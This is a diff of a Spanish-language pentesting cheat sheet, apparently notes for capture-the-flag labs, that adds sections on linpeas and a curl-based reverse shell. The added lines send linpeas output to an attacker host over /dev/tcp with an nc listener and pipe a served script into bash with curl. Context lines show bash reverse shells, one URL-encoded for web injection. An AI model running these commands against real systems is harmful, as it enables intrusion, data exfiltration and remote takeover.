@@ -38,7 +38,7 @@ export HYDRA_PROXY_HTTP=http://127.0.0.1:8080
 Para poder usar la llave privada que tu mismo creaste has lo siguiente:
 
 ```
-## Kali
+### Kali
 ssh-keygen
 
 ```
@@ -65,7 +65,20 @@ Para tirarle categorias de scripts para probar vulnerabilidades
 ```
 nmap --script "vuln and safe" -p443 10.10.10.17.1 -oN Scan
 ```
+## Linpeas
 
+Usa esto en caso de que no sepas como escalar privilegios.
+
+```
+#Target
+./linpeas.sh > out.txt
+
+cat out.txt > /dev/tcp/IP/port
+
+#Kali
+
+nc -lvpn port > out.txt
+```
 
 ## Stenografia
 
@@ -112,6 +125,22 @@ Recuerda cuando estes en una web e intentes ejecutar una reverse shell. Cambia e
 
 bash -c "bash -i >%26 /dev/tcp/IP/port 0>%261"
 bash -c "bash -i >& /dev/tcp/IP/port 0>&1"
+
+```
+
+Puedes usar curl para ejecutar una shell reversa aprovechandote de curl:
+
+```
+#index.html
+# python3 -m http.server 80
+#!/bin/bash
+
+bash -i >& /dev/tcp/IP/port 0>&1
+
+#target
+
+curl http:/10.10.14.57/ |bash
+
 
 ```
 
